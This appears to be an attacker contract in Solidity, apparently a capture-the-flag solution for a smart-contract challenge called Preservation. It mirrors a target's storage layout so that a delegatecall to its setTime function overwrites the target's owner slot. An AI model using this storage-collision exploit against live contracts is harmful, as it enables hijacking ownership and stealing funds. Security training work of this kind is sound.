// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {
    address x1;
    address x2;
    address owner;

    function setTime(uint _time) public {
        owner = address(_time);
    }
}